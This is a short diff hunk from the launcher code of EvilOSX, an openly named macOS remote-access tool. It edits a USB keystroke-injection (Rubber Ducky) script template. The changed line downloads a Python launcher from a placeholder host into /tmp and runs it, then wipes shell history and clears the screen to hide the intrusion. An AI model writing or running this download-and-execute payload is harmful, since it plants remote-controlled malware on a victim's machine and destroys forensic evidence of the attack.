@@ -12,7 +12,7 @@ class Launcher(LauncherABC):
         REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
         REM Also see https://ducktoolkit.com/vidpid/
         REM If timing is important, the following is a lot faster:
-        REM STRING cd /tmp; curl -s HOST_TO_PYTHON_LAUNCHER.py -o 1337.py; python 1337.py; history -cw; clear
+        REM STRING cd /tmp; curl -s HOST_TO_PYTHON_LAUNCHER.py -o 1337.py; python3 1337.py; history -cw; clear
         
         DELAY 1000
         GUI SPACE
